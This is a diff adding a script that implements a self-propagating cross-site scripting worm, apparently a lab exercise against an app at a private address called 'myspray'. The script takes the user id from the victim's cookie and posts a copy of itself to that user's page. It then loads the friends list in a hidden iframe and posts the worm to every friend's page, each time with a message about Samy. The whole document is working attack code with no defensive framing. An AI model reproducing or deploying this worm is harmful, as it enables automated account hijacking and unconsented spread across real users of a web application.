@@ -1,0 +1,56 @@
+<script>
+function xssWormSelf() {
+    //the cookie has the id of the user (if it's a new user, you'd have to log out and in again for it to worl)
+    var cookie = document.cookie.split('=')[1];
+    var url = "http://10.0.23.22/myspray/post"+cookie+".html";
+    //we use xmlhttprequest to post something in a form
+    request = new XMLHttpRequest();
+    request.open("POST", url, true);
+    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+    //we send both the functions as a message, and we need to send everything else too.
+    //We need to escape special chars, but only "escape" won't work because of the + signs. So we use encodeURIComponent.
+    request.send("entry=But most of all, Samy was charged with a felony"+encodeURIComponent("<script src=\"https:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/3.3.1\/jquery.min.js\"><\/script>\r\n\r\n<script>\r\n"+xssWormSelf.toString()+xssWormFriends.toString()+"\nxssWormSelf();\r\nxssWormFriends();\r\n<\/script>"));
+    //to get the id of the friends, i'm using an iframe with the friands pages. I append it to the end of the page
+    var x = document.createElement("IFRAME");
+    x.setAttribute("id", "IFRAME");
+    x.setAttribute("src", "http://10.0.23.22/myspray/myfriends.html    ");
+    x.setAttribute("width", 0);
+    x.setAttribute("height", 0);
+    document.body.appendChild(x);
+}
+function xssWormFriends() {
+    //we need to only do it when the iframe is ready
+    $(document).ready(function() {
+        $("#IFRAME").on('load', function() {
+            //we find all the links that have "writemessage" on it. 
+            var $friends = $("#IFRAME").contents().find('a[href*="writemessage"]')
+            //we then have to send this script to each friend
+            for (var i = $friends.length - 1; i >= 0; i--) {
+                //here we find out the id of a friend
+                var temp = $friends[i];
+                var str = temp.toString()
+                var pos = str.indexOf("writemessage", 25)+12
+                var num = str[pos]
+                pos = pos + 1
+                while (str[pos] != '.')
+                {
+                    num = num + str[pos]
+                    pos = pos + 1
+                }
+                //we then send a xmlhttp request to the friend with this script on it
+                var url = "http://10.0.23.22/myspray/post"+num+".html";
+                request = new XMLHttpRequest();
+                request.open("POST", url, true);
+                request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+                request.send("entry=But most of all, Samy was charged with a felony"+encodeURIComponent("<script src=\"https:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/3.3.1\/jquery.min.js\"><\/script>\r\n\r\n<script>\r\n"+xssWormSelf.toString()+'\n'+xssWormFriends.toString()+"\nxssWormSelf();\r\nxssWormFriends();\r\n<\/script>"));
+            }
+        });
+            
+    });
+}
+//we have to remember to run both functions
+xssWormSelf();
+xssWormFriends();
+
+
+</script>
